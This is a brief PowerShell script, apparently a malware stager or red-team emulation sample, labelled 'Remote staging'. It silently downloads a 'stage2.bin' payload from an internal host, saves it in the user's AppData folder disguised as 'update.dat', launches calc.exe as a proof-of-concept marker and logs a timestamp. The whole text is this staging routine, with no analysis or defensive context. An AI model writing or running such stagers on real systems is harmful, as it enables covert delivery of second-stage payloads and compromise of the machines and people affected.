
# Remote staging
$FetchUrl = 'http://internal.corp/cdn/stage2.bin'
$OutputPath = "$env:APPDATA\update.dat"
Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue
& 'calc.exe'
Set-Location -Path $env:TEMP
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
